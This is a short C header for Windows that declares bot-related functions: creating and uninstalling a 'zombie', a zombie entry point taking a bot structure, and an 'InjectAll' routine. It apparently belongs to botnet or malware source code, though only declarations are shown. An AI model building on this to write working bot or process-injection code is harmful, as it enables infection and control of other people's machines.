#pragma once
#include "bot_structs.h"

BOOL CreateZombieEx(LPTHREAD_START_ROUTINE start);
BOOL CreateZombie(void);
BOOL CreateZombieUninstall(void);

DWORD WINAPI ZombieEntryPoint(bot_t* pBot);
void WINAPI InjectAll(void);
DWORD WINAPI dwOtherEntryPoint(LPVOID p);